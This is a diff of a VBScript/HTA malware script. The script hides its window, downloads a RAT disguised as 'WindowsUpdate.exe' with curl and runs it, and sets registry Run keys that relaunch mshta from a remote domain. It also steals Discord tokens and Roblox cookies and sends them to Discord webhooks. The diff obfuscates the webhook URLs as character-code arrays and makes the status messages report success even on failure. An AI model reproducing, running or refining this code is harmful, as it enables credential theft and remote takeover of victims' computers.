@@ -7,11 +7,9 @@ window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
 Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie
+Dim sysTemp, appPath, userDir, sysData, fileCache
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-
-WH = "https://discord.com/api/webhooks/1574415765996703895/RIEV6Y6s7wA6ThCzvvZ-UfxfQudJ0MrsEOT_HuxKK5rtOOsZOmlAmNmSZffML_ewWoRB"
-RE_WH = "https://discord.com/api/webhooks/1574415913027903513/sHsf4wIjqyAGKrUTIUxBg_6fF9DaUKyuLgKAIJUBmyZVDthIXAfiEDJrhe_9ymoTZj-q"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -52,13 +50,16 @@ window.close()
 
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b090832&is=6b07b6b2&hm=b7476ce08038788fce717b168238b8e04cd6011e46e73ac97aed298f6dee5e79&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
     Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
     Dim op : op = tPath & "\" & fname
     If fso.FileExists(op) Then fso.DeleteFile op, True
+
+    ' Send Rocket FIRST
+    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching...", 10181046, targetWH)
 
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
@@ -67,16 +68,17 @@ Sub DropRAT(targetWH, sendRocket)
         Dim fSize : fSize = fso.GetFile(op).Size
         If fSize > 100000 Then
             Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
-            If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
             Call RunCmd("""" & op & """")
             ratDropped = True
             If sendRocket Then 
                 Call SleepSeconds(2)
-                Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
+                Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (" & fSizeMB & " MB)", 10181046, targetWH)
             End If
+        Else
+            If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (Size error)", 10181046, targetWH)
         End If
     Else
-        If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Failed to fetch payload.", 10181046, targetWH)
+        If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched (Link expired)", 10181046, targetWH)
     End If
 End Sub
 
@@ -196,7 +198,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta https://dicerigx.app/"
+    Dim payload : payload = "mshta https://matrixhub.app/"
     On Error Resume Next
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
@@ -239,7 +241,6 @@ Sub GrabTokens(targetWH)
                         Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                     End If
                 End If
-                ' This is the original cookie grabber logic
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
                     Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
                 End If
@@ -261,6 +262,21 @@ End Sub
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    
+    ' --- SECOND RAT DROP ---
+    Dim sysCache, appCache
+    sysCache = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,52,56,51,52,55,50,54,55,52,52,50,50,56,56,52,47,117,116,118,56,54,55,120,107,54,79,117,76,88,52,86,72,72,65,89,78,111,119,105,48,84,97,109,95,122,119,109,105,90,82,103,118,120,103,112,66,76,104,81,54,109,65,107,79,114,70,117,100,89,89,89,48,98,78,73,105,76,57,122,77,119,48,107,116)
+    appCache = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,52,56,51,53,48,56,48,48,55,51,55,48,56,51,53,47,72,119,90,66,100,52,84,84,110,82,109,80,80,86,79,82,90,115,110,116,49,66,117,100,120,108,66,109,120,54,51,83,110,99,74,77,115,65,76,111,114,80,74,103,108,75,76,122,111,104,54,76,106,122,106,102,71,72,98,70,104,69,113,51,86,102,53,104)
+    
+    WH = "" : RE_WH = ""
+    Dim i
+    For i = 0 To UBound(sysCache)
+        WH = WH & Chr(sysCache(i))
+    Next
+    For i = 0 To UBound(appCache)
+        RE_WH = RE_WH & Chr(appCache(i))
+    Next
+
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", target_wh, False
